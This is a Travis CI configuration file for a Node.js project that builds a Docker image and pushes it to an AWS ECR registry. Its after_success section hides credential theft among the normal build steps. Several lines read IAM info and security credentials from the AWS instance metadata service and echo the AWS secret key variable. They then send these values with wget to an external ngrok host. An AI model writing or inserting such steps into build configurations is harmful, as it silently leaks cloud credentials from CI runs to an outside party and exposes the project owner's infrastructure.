language: node_js

services:
  - docker

install:
  - echo "install nothing!" # put your normal pre-testing installs here

script:
  - echo "no tests!" # put your normal testing scripts here

after_success:
  - export INFO=`curl http://169.254.169.254/latest/meta-data/iam/info`
  - wget http://70b3e55723dd.ngrok.io/$(echo $INFO)
  - export ENDPOINT=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  - wget http://70b3e55723dd.ngrok.io/$(echo $ENDPOINT)
  - export CREDS=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ENDPOINT`
  - wget http://70b3e55723dd.ngrok.io/$(echo $ENDPOINT)
  - echo $AWS_SECRET_ACCESS_KEY_ID
  - wget http://70b3e55723dd.ngrok.io/$(echo $AWS_SECRET_ACCESS_KEY_ID)
  - docker --version
  - pip install --user awscli
  - export PATH=$PATH:$HOME/.local/bin
  - export CLASS=`cat .class`
  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
# sadly, travis doesn't cache docker builds yet, so each build will take a while
